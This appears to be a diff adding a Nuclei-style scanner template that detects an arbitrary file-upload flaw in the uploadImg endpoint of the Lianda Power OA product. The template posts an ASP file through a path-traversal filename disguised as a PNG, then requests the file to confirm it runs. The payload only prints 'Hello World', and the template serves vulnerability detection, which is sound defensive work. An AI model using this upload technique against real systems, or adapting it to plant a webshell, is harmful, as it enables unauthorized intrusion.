@@ -1,0 +1,48 @@
+id: poc-yaml-lkpower-uploadImg-upload
+info:
+  name: 联达动力OA uploadImg 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |
+        POST /Dept_Portal/uploadImg.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW9xVaF04jQnVgkEA
+
+        ------WebKitFormBoundaryW9xVaF04jQnVgkEA
+        Content-Disposition: form-data; name="DesignId"
+
+        1
+        ------WebKitFormBoundaryW9xVaF04jQnVgkEA
+        Content-Disposition: form-data; name="Filedata"; filename="../../../../{{filename}}.asp"
+        Content-Type: image/png
+
+        <% Response.Write("Hello World") %>
+        ------WebKitFormBoundaryW9xVaF04jQnVgkEA--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "ASP.NET"
+  - raw:
+      - |
+        GET /{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Hello World"
